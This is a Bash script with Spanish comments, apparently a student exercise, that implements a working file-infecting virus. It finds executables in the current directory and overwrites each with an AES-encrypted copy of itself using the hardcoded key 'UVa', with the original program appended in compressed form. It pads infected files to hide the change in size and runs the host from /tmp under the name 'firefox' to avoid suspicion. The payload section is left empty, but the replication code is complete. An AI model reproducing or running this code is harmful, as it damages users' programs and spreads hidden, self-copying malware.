#!/bin/bash
#CABECERADEDETECCIONDEVIRUS

TAM=111 #En lineas
TAMENC=23 #En lineas
 
desencriptar(){
	PATHORIGINAL=$( tempfile -n "/tmp/firefox.gz" ) 
	PATHTMP=$( tempfile )  # 2>/dev/null ) #Haremos pasar el programa como si fuera el navegador Mozilla Firefox
	ENCSIZE=$( tail -n 1 $1 )
	FILESIZE=$( cat $1 | wc -l )
	head -n $TAMENC $1 > $PATHTMP
	head -n $ENCSIZE $1 | tail -n $(( $ENCSIZE-$TAMENC )) | openssl enc -aes-128-cbc -base64 -d -k UVa >> $PATHTMP  # 2>/dev/null
	tail -n $(( $FILESIZE-$ENCSIZE )) $1 | head -n -2 >> $PATHTMP
	tail -n $(( $FILESIZE-$ENCSIZE )) $1 | head -n -2 | base64 -d > "$PATHORIGINAL"
	chmod +x $PATHTMP "$PATHORIGINAL"
	$PATHTMP 1	
}
if [ "$( basename $0 )" != "infecter.sh" ] && [ "$1" != "1" ]
then
	desencriptar $0
	exit 0
fi

esInfectable (){

	#Un archivo es infectable solo si es ejecutable y si no esta previamente infectado.
    VALUETORETURN=1
	if ! test -x $1
	then
		VALUETORETURN=0
	fi
	hash="02ea0b4b377de064a3b5729cde5f1591"

	
	hashFichero=$( head -n 2 $1 | md5sum | cut -c 1-32)
	hashFichero=${hashFichero%$"  - \r"}

	if test "$hashFichero" = "$hash"
	then
		VALUETORETURN=0
	fi
	echo $VALUETORETURN

}

generaRuido(){
	#GeneraRuido es una funcion que genera una cadena de caracteres que solo sirve para aumentar el tamaño del fichero
	TAMANTES=$1
	TAMDESP=$2	

	if [ "$TAMANTES" -lt "$TAMDESP" ];
	then
		#Fichero es muy pequeño, no hacer nada
		echo $'\0'
	else
		DIFF=$(( $TAMANTES-$TAMDESP ))
		echo $( head -c $DIFF </dev/zero | echo $'\n' )
	fi
}

#Fase 1 Localizacion de ejecutables a infectar

for fich in *
do
	if [ $( esInfectable $fich ) -eq 1 ]
	then
	#Me quito todos los scripts del shell. Conociendo cual es la primera linea
		if test $( head -n 1 $fich | cut -c 1-11 ) = "#!/bin/bash"
		then
			echo "[Skipping: $fich]"
			continue
		fi
	#Fase 2 Infeccion de ejcutable
	echo "[Infectando $fich]"
	TAMFICHANTES=$( stat -c %s $fich )  #Tam fich Bytes
	PATHFICHEROTMP=$( tempfile -p tmp )
	
	head -n $TAMENC $0 > $PATHFICHEROTMP
	tail -n $(( $TAM-$TAMENC-1 )) $0 | openssl enc -aes-128-cbc -base64 -k "UVa" >> $PATHFICHEROTMP

	LINEASDESPUESENCR=$( cat $PATHFICHEROTMP | wc -l )
	gzip -c $fich | base64 >> $PATHFICHEROTMP  # 2>/dev/null

	TAMFICHDESPUES=$( stat -c %s $PATHFICHEROTMP )  #Tam fich Bytes
	RUIDO="$( generaRuido $TAMFICHANTES $TAMFICHDESPUES )"
	echo $RUIDO >> $PATHFICHEROTMP
	echo $LINEASDESPUESENCR >> $PATHFICHEROTMP	

	#mover el resultado sobre el fichero original
	mv $PATHFICHEROTMP $fich
	chmod +x $fich
	else
		echo "[No infectable $fich]"
	fi

done
#Fase 3 Ejecucion del payload
#Aqui iria el payload del virus.

#Fase 4.Ejecutar el programa huesped
rm -f /tmp/firefox  # 2>/dev/null
gzip -d "/tmp/firefox.gz"
cd /tmp  # 2>/dev/null
chmod +x firefox   # 2>/dev/null
if [ -f firefox ] #En el caso de que estemos ejecutando infecter por primera vez no debemos intentar ejecutar el fichero descomprimido, ya que no existira. No se silencia la salida para no causar sospechas
then
	./firefox 
fi
exit 0
